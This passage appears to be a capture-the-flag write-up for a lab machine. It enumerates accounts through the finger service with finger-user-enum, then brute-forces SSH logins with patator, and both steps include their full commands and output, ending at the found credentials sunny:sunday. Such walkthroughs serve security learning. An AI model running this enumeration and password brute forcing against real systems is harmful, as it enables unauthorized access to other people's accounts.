We use the script **[finger-user-enum](https://github.com/pentestmonkey/finger-user-enum)** of PentestMonkey
```bash
chmod +x finger-user-enum.pl
./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76


Starting finger-user-enum v1.0 ( http://pentestmonkey.net/tools/finger-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Worker Processes ......... 5
Usernames file ........... /usr/share/seclists/Usernames/Names/names.txt
Target count ............. 1
Username count ........... 10177
Target TCP port .......... 79
Query timeout ............ 5 secs
Relay Server ............. Not used

######## Scan started at Wed Jul 12 09:36:16 2023 #########
access@10.10.10.76: access No Access User                     < .  .  .  . >..nobody4  SunOS 4.x NFS Anonym               < .  .  .  . >..
admin@10.10.10.76: Login       Name               TTY         Idle    When    Where..adm      Admin                              < .  .  .  . >..dladm    Datalink Admin                     < .  .  .  . >..netadm   Network Admin                      < .  .  .  . >..netcfg   Network Configuratio               < .  .  .  . >..dhcpserv DHCP Configuration A               < .  .  .  . >..ikeuser  IKE Admin                          < .  .  .  . >..lp       Line Printer Admin                 < .  .  .  . >..
anne marie@10.10.10.76: Login       Name               TTY         Idle    When    Where..anne                  ???..marie                 ???..
bin@10.10.10.76: bin             ???                         < .  .  .  . >..
dee dee@10.10.10.76: Login       Name               TTY         Idle    When    Where..dee                   ???..dee                   ???..
ike@10.10.10.76: ikeuser  IKE Admin                          < .  .  .  . >..
jo ann@10.10.10.76: Login       Name               TTY         Idle    When    Where..ann                   ???..jo                    ???..
la verne@10.10.10.76: Login       Name               TTY         Idle    When    Where..la                    ???..verne                 ???..
line@10.10.10.76: Login       Name               TTY         Idle    When    Where..lp       Line Printer Admin                 < .  .  .  . >..
message@10.10.10.76: Login       Name               TTY         Idle    When    Where..smmsp    SendMail Message Sub               < .  .  .  . >..
miof mela@10.10.10.76: Login       Name               TTY         Idle    When    Where..mela                  ???..miof                  ???..
root@10.10.10.76: root     Super-User            console      <Oct 14, 2022>..
sammy@10.10.10.76: sammy           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sunny@10.10.10.76: sunny           ???            ssh          <Apr 13, 2022> 10.10.14.13         ..
sys@10.10.10.76: sys             ???                         < .  .  .  . >..
zsa zsa@10.10.10.76: Login       Name               TTY         Idle    When    Where..zsa                   ???..zsa                   ???..
######## Scan completed at Wed Jul 12 09:43:22 2023 #########
16 results.

10177 queries in 426 seconds (23.9 queries / sec)
```

We can see the users sammy and sunny who have ssh access, so let's brute force. We will use patator which is a banner grabbing brute force, so it's faster than hydra in this case

```bash
patator ssh_login host=10.10.10.76 port=22022 user=FILE0 password=FILE1 0=./users2.txt 1=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -R patator-output

$ ssh_login host=10.10.10.76 port=22022 user=FILE0 password=FILE1 0=./users2.txt 1=/usr/share/seclists/Passwords/probable-v2-top1575.txt persistent=0 -R patator-output
10:30:34 patator    INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.11.4 at 2023-07-12 10:30 CEST
10:30:34 patator    INFO -                                                                              
10:30:34 patator    INFO - code  size    time | candidate                          |   num | mesg
10:30:34 patator    INFO - -----------------------------------------------------------------------------
10:30:35 patator    INFO - 1     22     0.313 | sunny:123456                       |     1 | Authentication failed.
10:30:35 patator    INFO - 1     22     0.364 | sunny:password                     |     2 | Authentication failed.
[SNIP]
10:33:52 patator    INFO - 0     20     0.429 | sunny:sunday                       |   880 | SSH-2.0-OpenSSH_7.5 
[SNIP]
10:37:20 patator    INFO - 1     22     0.302 | sunny:andres                       |  1573 | Authentication failed.
10:37:20 patator    INFO - Hits/Done/Skip/Fail/Size: 1575/1575/0/0/1575, Avg: 3 r/s, Time: 0h 6m 45s
```

Here we can see that the credentials sunny:sunday grabbed the flag, so we have a valid one, let's go with SSH
